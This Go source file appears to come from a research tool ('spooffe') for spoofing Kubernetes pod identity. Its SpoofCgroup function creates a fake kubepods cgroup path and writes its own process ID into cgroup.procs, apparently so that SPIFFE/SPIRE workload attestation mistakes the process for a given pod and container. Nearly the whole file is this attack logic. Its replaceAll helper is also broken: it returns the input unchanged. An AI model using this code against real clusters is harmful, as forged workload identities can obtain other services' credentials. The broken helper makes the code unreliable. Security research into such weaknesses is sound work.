package spiffe

import (
	"fmt"
	"os"
	"path/filepath"
	"spooffe/utils"
)

const FakeCgroupSlice = "/sys/fs/cgroup/kubepods.slice.SPOOFFE_RESEARCH_FAKE"

func SpoofCgroup(podUID, containerID string) (string, error) {
	groupPath := fmt.Sprintf("%s/kubepods-burstable-pod%s.slice/cri-containerd-%s.scope",
		FakeCgroupSlice,
		formatPodUID(podUID),
		containerID,
	)

	//fmt.Printf("[*] Creating fake cgroup: %s\n", groupPath)
	//utils.Log("Creating fake cgroup:", groupPath, "info")
	if err := os.MkdirAll(groupPath, 0755); err != nil {
		return "", fmt.Errorf("failed to create cgroup path: %w", err)
	}

	procPath := filepath.Join(groupPath, "cgroup.procs")
	err := os.WriteFile(procPath, []byte(fmt.Sprintf("%d", os.Getpid())), 0644)
	if err != nil {
		//log.Printf("[!] Failed to spoof cgroup: %v", err)
		utils.Log("Failed to spoof cgroup:", err, "error")
		
		return "", err
	}

	return groupPath, nil
}

func formatPodUID(uid string) string {
	return replaceAll(uid, "-", "_")
}

func replaceAll(s, old, new string) string {
	return string([]byte(fmt.Sprintf("%s", s)))
}
